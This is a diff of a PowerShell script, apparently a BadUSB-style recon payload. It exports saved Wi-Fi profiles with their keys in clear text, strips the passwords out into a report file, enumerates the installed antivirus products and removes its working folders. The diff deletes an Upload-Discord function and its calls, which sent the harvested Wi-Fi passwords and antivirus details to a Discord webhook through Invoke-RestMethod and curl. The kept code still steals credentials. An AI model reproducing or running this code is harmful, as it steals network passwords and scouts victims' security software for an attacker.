@@ -9,50 +9,21 @@ function Get-Nirsoft {
 
 }
 
-function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
-}
 
 function Wifi {
-New-Item -Path $env:temp -Name "RECON_APPS" -ItemType "directory"
-Set-Location -Path "$env:temp/RECON_APPS"; netsh wlan export profile key=clear
+$WiFi = New-Item -Path $env:temp -Name "RECON_APPS" -ItemType "directory"
+Set-Location -Path $P1X3L; netsh wlan export profile key=clear
 Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $P1X3L\WiFi_Passwords-RECON_Report.txt
-Upload-Discord -file "$P1X3L\WiFi_Passwords-RECON_Report.txt" -text "Wifi password :"
-Set-Location -Path "$env:temp"
-Remove-Item -Path "$env:tmp/RECON_APPS" -Force -Recurse;
+Set-Location -Path "$P1X3L"
+Remove-Item -Path "$P1X3L\RECON_APPS" -Force -Recurse;
 }
 
  function Del-Nirsoft-File {
-  cd C:\
-  rmdir -R \temp
+  cd $P1X3L
+  rmdir -R $P1X3L\RECONAPPS
 }
 
 function version-av {
-  mkdir \temp 
-  cd \temp
-  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
-  Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
-  cd C:\
-  rmdir -R \temp
+  cd $P1X3L
+  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath $P1X3L\resultat.txt -Encoding utf8
 }
-
-
